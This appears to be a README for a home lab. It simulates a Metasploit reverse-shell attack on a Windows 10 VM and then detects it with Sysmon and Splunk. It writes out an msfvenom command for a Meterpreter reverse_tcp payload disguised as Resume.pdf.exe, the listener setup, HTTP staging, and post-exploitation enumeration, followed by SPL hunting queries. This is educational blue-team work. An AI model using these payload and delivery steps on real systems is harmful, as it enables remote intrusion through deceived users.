@@ -1,1 +1,388 @@
 # Endpoint-Reverse-Shell-Detection-Lab-Sysmon-Splunk-
+Metasploit Reverse Shell Attack & Splunk Detection Lab
+Description
+Simulated a full end-to-end cyberattack in a controlled virtual lab environment using Kali Linux as the attacker and Windows 10 as the victim. A malicious reverse shell payload was crafted with msfvenom, disguised as Resume.pdf.exe, and delivered to the victim via a Python HTTP server — simulating a real-world phishing/social engineering attack. A Meterpreter reverse TCP shell was established through Metasploit Framework, granting full remote access to the target machine. Splunk Enterprise with Sysmon was configured on the Windows victim to ingest and monitor telemetry, allowing SOC-style analysis and detection of the attack activity.
+Key Skills Demonstrated
+
+Offensive security with Metasploit Framework & msfvenom
+Payload crafting and social engineering delivery (file disguise technique)
+Reverse shell exploitation (windows/x64/meterpreter/reverse_tcp)
+Post-exploitation enumeration (net user, net localgroup, ipconfig, shell)
+Network reconnaissance with Nmap
+Python HTTP server for payload staging and delivery
+Splunk Enterprise installation, index creation & configuration
+inputs.conf configuration for Windows Event Log & Sysmon ingestion
+Sysmon log analysis and threat hunting with SPL queries
+SOC blue team detection using Splunk Search & Reporting
+
+Prerequisites
+
+Kali Linux VM (attacker) — IP: 192.168.20.11
+Windows 10 VM (victim) — IP: 192.168.20.10
+Both VMs connected on the same internal/host-only network
+Metasploit Framework installed on Kali Linux
+Splunk Enterprise installed on the Windows 10 VM
+Sysmon installed and configured on the Windows 10 VM
+
+Walk-through (step-by-step)
+
+Phase 1 – Reconnaissance
+
+Scan the target with Nmap
+
+From Kali Linux, perform an Nmap scan against the Windows victim to discover open ports.
+Command: nmap 192.168.20.10 -Pn
+Result: Port 3389/tcp (RDP — ms-wbt-server) is open, confirming the host is alive and reachable.<br/>
+<img src="https://imgur.com/Screenshot__129_" height="80%" width="80%" alt="Nmap scan results showing port 3389 open"/>
+
+
+
+
+<br />
+
+Phase 2 – Payload Crafting
+
+Review msfvenom options and available payloads
+
+Run msfvenom --help to review payload crafting syntax, then msfvenom -l payloads to browse available Windows payloads.
+The payload windows/x64/meterpreter/reverse_tcp was selected — a staged Meterpreter shell that calls back to the attacker.<br/>
+<img src="https://imgur.com/Screenshot__131_" height="80%" width="80%" alt="msfvenom help menu"/>
+
+
+
+
+<br />
+
+Identify the correct payload
+
+From the payload list, locate and confirm windows/x64/meterpreter/reverse_tcp — highlighted as the chosen staged reverse TCP Meterpreter payload.<br/>
+<img src="https://imgur.com/Screenshot__132_" height="80%" width="80%" alt="msfvenom payload list highlighting windows/x64/meterpreter/reverse_tcp"/>
+
+
+
+
+<br />
+
+Generate the malicious payload
+
+Craft the payload disguised as a PDF file to trick the victim into executing it.
+Command:
+
+
+
+     msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe
+
+Output: Resume.pdf.exe saved successfully (238,080 bytes).<br/>
+<img src="https://imgur.com/Screenshot__134_" height="80%" width="80%" alt="msfvenom generating Resume.pdf.exe payload"/>
+
+
+<br />
+
+Phase 3 – Listener Setup
+
+Launch Metasploit Framework
+
+Open a terminal on Kali Linux and run msfconsole.
+Navigate to exploit/multi/handler to set up the reverse shell listener.<br/>
+<img src="https://imgur.com/Screenshot__138_" height="80%" width="80%" alt="Metasploit msfconsole launched"/>
+
+
+
+
+<br />
+
+Configure the multi/handler — set payload
+
+Inside Metasploit, run:
+
+
+
+     use exploit/multi/handler
+     set payload windows/x64/meterpreter/reverse_tcp
+     show options
+
+Confirm the payload is set correctly.<br/>
+<img src="https://imgur.com/Screenshot__141_" height="80%" width="80%" alt="Metasploit multi/handler payload configured"/>
+
+
+<br />
+
+Set LHOST and verify options
+
+Set the attacker's IP as the listener address:
+
+
+
+     set lhost 192.168.20.11
+     show options
+
+Confirm: LHOST = 192.168.20.11, LPORT = 4444.<br/>
+<img src="https://imgur.com/Screenshot__143_" height="80%" width="80%" alt="LHOST and LPORT options confirmed"/>
+
+
+<br />
+
+Start the listener
+
+Run the handler: run
+Output: [*] Started reverse TCP handler on 192.168.20.11:4444<br/>
+<img src="https://imgur.com/Screenshot__146_" height="80%" width="80%" alt="Reverse TCP handler started and listening"/>
+
+
+
+
+<br />
+
+Phase 4 – Payload Delivery
+
+Host the payload on a Python HTTP server
+
+On Kali Linux Desktop, confirm Resume.pdf.exe is present with ls, then start a web server:
+
+
+
+     python3 -m http.server 9999
+
+Output: Serving HTTP on 0.0.0.0 port 9999<br/>
+<img src="https://imgur.com/Screenshot__148_" height="80%" width="80%" alt="Python HTTP server hosting Resume.pdf.exe on port 9999"/>
+
+
+<br />
+
+Download the payload on the victim machine
+
+On the Windows 10 VM, open Microsoft Edge (InPrivate) and navigate to 192.168.20.11:9999.
+The directory listing shows Resume.pdf.exe — click to download.<br/>
+<img src="https://imgur.com/Screenshot__149_" height="80%" width="80%" alt="Victim downloading Resume.pdf.exe from attacker HTTP server"/>
+
+
+
+
+<br />
+
+Execute the payload — bypass SmartScreen
+
+Open the downloaded file. Windows SmartScreen warns the publisher is unknown.
+Click Run to proceed, simulating a victim who ignores the security warning.<br/>
+<img src="https://imgur.com/Screenshot__151_" height="80%" width="80%" alt="SmartScreen warning — Run clicked to execute payload"/>
+
+
+
+
+<br />
+
+Phase 5 – Exploitation & Post-Exploitation
+
+Meterpreter session established — drop into shell
+
+Back on Kali, the Meterpreter session opens automatically once the victim executes the payload.
+Type shell to obtain a native Windows command prompt on the victim.
+Confirmation: C:\Users\admin\Downloads> returned — full remote code execution achieved.<br/>
+<img src="https://imgur.com/Screenshot__157_" height="80%" width="80%" alt="Meterpreter shell — Windows CMD prompt on victim machine"/>
+
+
+
+
+<br />
+
+Enumerate local users
+
+Command: net user
+Result: Accounts on \\DESKTOP-LOSP218 revealed — admin, Administrator, DefaultAccount, Guest, WDAGUtilityAccount.<br/>
+<img src="https://imgur.com/Screenshot__158_" height="80%" width="80%" alt="net user output enumerating local accounts"/>
+
+
+
+
+<br />
+
+Enumerate local groups
+
+Command: net localgroup
+Result: All local security groups listed, including Administrators, Remote Desktop Users, Guests, Hyper-V Administrators, and more.<br/>
+<img src="https://imgur.com/Screenshot__159_" height="80%" width="80%" alt="net localgroup enumerating all local groups"/>
+
+
+
+
+<br />
+
+Gather network configuration
+
+Command: ipconfig
+Result: Victim IPv4 address confirmed as 192.168.20.10, Subnet Mask 255.255.255.0.<br/>
+<img src="https://imgur.com/Screenshot__160_" height="80%" width="80%" alt="ipconfig output confirming victim network config"/>
+
+
+
+
+<br />
+
+Phase 6 – Splunk Configuration & Log Ingestion
+
+Verify Splunk local config folder
+
+Navigate to C:\Program Files\Splunk\etc\system\local.
+Confirm existing config files are present: authentication.conf, server.conf, web.conf, etc.<br/>
+<img src="https://imgur.com/Screenshot__161_" height="80%" width="80%" alt="Splunk local config folder contents"/>
+
+
+
+
+<br />
+
+Copy inputs.conf from Splunk defaults
+
+Navigate to C:\Program Files\Splunk\etc\system\default.
+Right-click inputs.conf → drag → Copy here into the local folder.<br/>
+<img src="https://imgur.com/Screenshot__162_" height="80%" width="80%" alt="Copying inputs.conf from default to local"/>
+
+
+
+
+<br />
+
+Open and edit inputs.conf
+
+In the local folder, right-click inputs.conf → Open with → Notepad.
+Add the following log source stanzas to forward events to the endpoint index:
+
+
+
+      [WinEventLog://Microsoft-Windows-Sysmon/Operational]
+      index = endpoint
+      disabled = false
+      renderXml = true
+      source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+
+      [WinEventLog://Microsoft-Windows-Windows Defender/Operational]
+      index = endpoint
+      disabled = false
+
+      [WinEventLog://Microsoft-Windows-PowerShell/Operational]
+      index = endpoint
+      disabled = false
+
+      [WinEventLog://Application]
+      index = endpoint
+      disabled = false
+
+      [WinEventLog://Security]
+      index = endpoint
+      disabled = false
+
+      [WinEventLog://System]
+      index = endpoint
+      disabled = false
+<br/>
+<img src="https://imgur.com/Screenshot__166_" height="80%" width="80%" alt="inputs.conf configured with Sysmon and all Windows Event Log sources"/>
+<br />
+
+19. **Confirm `inputs.conf` saved in local folder**
+    - Right-click `inputs.conf` in the local folder to verify it is present and has been updated.<br/>
+<img src="https://imgur.com/Screenshot__163_" height="80%" width="80%" alt="inputs.conf confirmed in Splunk local folder"/>
+<br />
+
+20. **Verify the `endpoint` index in Splunk**
+    - In Splunk, go to **Settings** → **Indexes** (via the Apps menu).
+    - Confirm the `endpoint` index is listed as **Active**.<br/>
+<img src="https://imgur.com/Screenshot__168_" height="80%" width="80%" alt="Splunk Indexes page — endpoint index active"/>
+<br />
+
+---
+
+### Phase 7 – Detection & Threat Hunting in Splunk
+
+21. **Search the endpoint index — verify data ingestion**
+    - In Splunk Search & Reporting, type: `index="endpoint"` and run.
+    - Result: **1,458 events** returned — Windows and Sysmon logs are successfully flowing into Splunk.<br/>
+<img src="https://imgur.com/Screenshot__170_" height="80%" width="80%" alt="index=endpoint returns 1458 events confirming log ingestion"/>
+<br />
+
+22. **Search for the attacker's IP address**
+    - Run: `index=endpoint 192.168.20.11`
+    - Result: **46 events** containing the attacker's IP — a key Indicator of Compromise (IOC).<br/>
+<img src="https://imgur.com/Screenshot__171_" height="80%" width="80%" alt="Splunk search for attacker IP 192.168.20.11 returns 46 events"/>
+<br />
+
+23. **Analyse `dest_port` field — confirm C2 port 4444**
+    - Click on the `dest_port` field in the sidebar.
+    - Result: Port **4444** (Meterpreter C2 callback) is detected alongside port 3389, confirming the active reverse shell connection from victim to attacker.<br/>
+<img src="https://imgur.com/Screenshot__172_" height="80%" width="80%" alt="dest_port showing port 4444 C2 traffic from victim to attacker"/>
+<br />
+
+24. **Search for the malicious file directly**
+    - Run: `index=endpoint Resume.pdf.exe`
+    - Result: **16 events** all linked to the malicious payload. The timeline spike confirms the exact moment of execution.<br/>
+<img src="https://imgur.com/Screenshot__173_" height="80%" width="80%" alt="Splunk search for Resume.pdf.exe returns 16 events"/>
+<br />
+
+25. **Inspect EventCode values**
+    - Click the `EventCode` field while the `Resume.pdf.exe` search is active.
+    - Result: **EventCode 15** (Sysmon — FileCreateStreamHash) dominates at 37.5%, flagging that the file was downloaded via the browser and contains an Alternate Data Stream identifier (Zone.Identifier).<br/>
+<img src="https://imgur.com/Screenshot__174_" height="80%" width="80%" alt="EventCode analysis — EventCode 15 FileCreateStreamHash most frequent"/>
+<br />
+
+26. **Examine full Sysmon EventCode 15 event**
+    - Filter: `index=endpoint Resume.pdf.exe EventCode=15`
+    - Expand the event. Key fields confirmed:
+      - `file_name`: `Resume.pdf.exe`
+      - `file_path`: `C:\Users\kow\Downloads\Resume.pdf.exe`
+      - `http_referrer`: `http://192.168.20.11:9999/`
+      - `process_name`: `msedge.exe`
+      - `EventDescription`: `FileCreateStreamHash`
+      - `technique_id`: **T1189** — Drive-by Compromise<br/>
+<img src="https://imgur.com/Screenshot__175_" height="80%" width="80%" alt="Expanded Sysmon EventCode 15 showing full event fields for Resume.pdf.exe"/>
+<br />
+
+27. **Review full IOC enrichment fields**
+    - Scrolling further through the event reveals full file hashes (SHA1, SHA256, MD5, IMPHASH), `HostUrl` confirming the file was served from `192.168.20.11:9999/Resume.pdf.exe`, and `ZoneId=3` (Internet Zone — file came from an untrusted external source).<br/>
+<img src="https://imgur.com/Screenshot__176_" height="80%" width="80%" alt="Full Sysmon event fields — hashes, HostUrl, ZoneId for Resume.pdf.exe"/>
+<br />
+
+28. **Trace full process chain with process GUID**
+    - Copy the `process_guid` value from the event and search: `index=endpoint {cd03015e-cbbc-69a5-c208-000000000700}`
+    - Result: **6 events** returned, tracing all Sysmon activity linked back to the malicious process from execution to post-exploitation commands.<br/>
+<img src="https://imgur.com/Screenshot__179_" height="80%" width="80%" alt="Process GUID search tracing full Meterpreter process chain in Splunk"/>
+<br />
+
+29. **View post-exploitation commands in Statistics view**
+    - Using the process GUID search with a table view (`ParentImage`, `Image`, `CommandLine`), the full attacker command sequence is visible:
+      - `Resume.pdf.exe` → spawned `cmd.exe`
+      - `cmd.exe` → `net user`
+      - `cmd.exe` → `net localgroup`
+      - `cmd.exe` → `ipconfig`
+    - All attacker enumeration commands captured and attributed to the malicious parent process.<br/>
+<img src="https://imgur.com/Screenshot__180_" height="80%" width="80%" alt="Splunk statistics table showing post-exploitation commands spawned by Resume.pdf.exe"/>
+<br />
+
+---
+
+## Splunk Queries Used
+
+| Query | Purpose |
+|---|---|
+| `index="endpoint"` | Confirm data ingestion — baseline check |
+| `index=endpoint 192.168.20.11` | Find all events referencing the attacker IP |
+| `index=endpoint Resume.pdf.exe` | Isolate all events linked to the malicious payload |
+| `index=endpoint Resume.pdf.exe EventCode=15` | Filter Sysmon FileCreateStreamHash events |
+| `index=endpoint {process_guid}` | Trace the full process chain from initial execution |
+
+## Attack Summary
+
+| Phase | Action | Tool |
+|---|---|---|
+| Reconnaissance | Port scan of Windows target | Nmap |
+| Payload Crafting | Generated reverse TCP EXE disguised as PDF | msfvenom |
+| Delivery | Hosted payload via HTTP; victim downloaded via Edge | Python http.server |
+| Execution | Victim ran payload — SmartScreen bypassed | Windows 10 / Edge |
+| Exploitation | Caught reverse shell — full remote access gained | Metasploit multi/handler |
+| Post-Exploitation | Enumerated users, groups, network config | Meterpreter / Windows CMD |
+| Detection | Ingested Sysmon + Windows logs; hunted IOCs via SPL | Splunk Enterprise + Sysmon |
+
+## Outcome & Summary
+A fully functional Meterpreter reverse shell was established from a Windows 10 victim machine back to a Kali Linux attacker using `windows/x64/meterpreter/reverse_tcp`. The payload was disguised as a legitimate PDF resume and staged on a Python HTTP server, simulating a drive-by download attack (MITRE ATT&CK **T1189**). Post-exploitation enumeration confirmed the attacker had full access — enumerating local user accounts, security groups, and network details through the Meterpreter shell.
+
+On the defensive side, Splunk Enterprise with Sysmon and Windows Event Log ingestion via `inputs.conf` successfully captured the full attack chain — from the initial file download (Sysmon EventCode 15, `FileCreateStreamHash`, `ZoneId=3`) to the reverse shell C2 callback on port 4444, to every post-exploitation command (`net user`, `net localgroup`, `ipconfig`) — all traceable through the malicious parent process `Resume.pdf.exe` using Splunk's SPL.
+
+> ⚠️ **Disclaimer:** This project was conducted entirely in an isolated virtual lab environment for educational purposes only. All techniques demonstrated are for cybersecurity learning and should never be applied to systems without explicit written authorization.
